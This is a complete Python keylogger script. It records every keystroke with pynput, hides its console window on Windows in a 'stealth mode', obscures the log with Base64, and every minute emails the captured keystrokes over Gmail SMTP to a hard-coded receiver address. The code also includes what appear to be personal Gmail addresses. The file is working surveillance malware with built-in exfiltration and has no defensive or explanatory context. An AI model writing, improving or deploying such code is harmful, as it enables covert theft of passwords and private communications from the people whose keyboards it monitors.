import logging
import logging.handlers
from pynput import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import sys
import base64

# Configuration
LOG_FILE = 'keylog.txt'
LOG_MAX_SIZE = 1024 * 1024  # 1 MB
LOG_BACKUP_COUNT = 3
ENCRYPT_LOG = True  # Encrypt log file
STEALTH_MODE = True  # Run without a console window
EMAIL_REPORTING = True  # Send logs via email
EMAIL_INTERVAL = 60  # Send email every 60 seconds
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SMTP_USER = 'arulsci@gmail.com'
SMTP_PASSWORD = ''  # Insert your email password here
EMAIL_RECEIVER = 'arulartad@gmail.com'

# Encrypt function (basic Base64 encoding)
def encrypt(data):
    return base64.b64encode(data.encode()).decode()

# Decrypt function (basic Base64 decoding)
def decrypt(data):
    return base64.b64decode(data.encode()).decode()

# Set up logging with rotation
def setup_logging():
    handler = logging.handlers.RotatingFileHandler(
        LOG_FILE, maxBytes=LOG_MAX_SIZE, backupCount=LOG_BACKUP_COUNT
    )
    formatter = logging.Formatter('%(asctime)s: %(message)s')
    handler.setFormatter(formatter)
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    logger.addHandler(handler)
    return logger

# Send email with logs
def send_email(logger):
    try:
        with open(LOG_FILE, 'r') as f:
            log_data = f.read()

        if ENCRYPT_LOG:
            log_data = encrypt(log_data)

        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = 'Keylogger Report'
        msg.attach(MIMEText(log_data, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.sendmail(SMTP_USER, EMAIL_RECEIVER, msg.as_string())
        server.quit()

        logger.info("Logs sent via email.")
    except Exception as e:
        logger.error(f"Error sending email: {e}")

# Key press event handler
def on_press(key):
    try:
        log_entry = f"Key pressed: {key.char}"
    except AttributeError:
        log_entry = f"Special key pressed: {key}"

    if ENCRYPT_LOG:
        log_entry = encrypt(log_entry)

    logger.info(log_entry)

# Key release event handler
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Main function
def main():
    global logger

    if STEALTH_MODE and sys.platform == 'win32':
        import win32gui
        import win32con
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

    logger = setup_logging()
    logger.info("Keylogger started.")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            while listener.running:
                listener.join(EMAIL_INTERVAL)
                if EMAIL_REPORTING:
                    send_email(logger)
        except KeyboardInterrupt:
            logger.info("Keylogger stopped by user.")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            logger.info("Keylogger stopped.")

if __name__ == "__main__":
    main()
